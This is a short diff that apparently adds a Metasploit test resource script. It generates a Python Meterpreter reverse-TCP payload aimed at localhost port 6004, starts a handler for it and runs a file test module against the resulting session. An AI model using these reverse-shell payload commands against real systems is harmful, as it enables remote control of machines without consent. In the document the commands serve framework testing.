@@ -1,0 +1,5 @@
+use python/meterpreter/reverse_tcp
+generate -o /tmp/meterpreter-spec-rb-python-meterpreter-reverse-tcp20220131-3859-wwc22u.py -f raw AutoVerifySessionTimeout=10 MeterpreterTryToFork=false PythonMeterpreterDebug=true lport=6004 lhost=127.0.0.1
+to_handler
+use test/file
+run session=4 AddEntropy=true Verbose=true
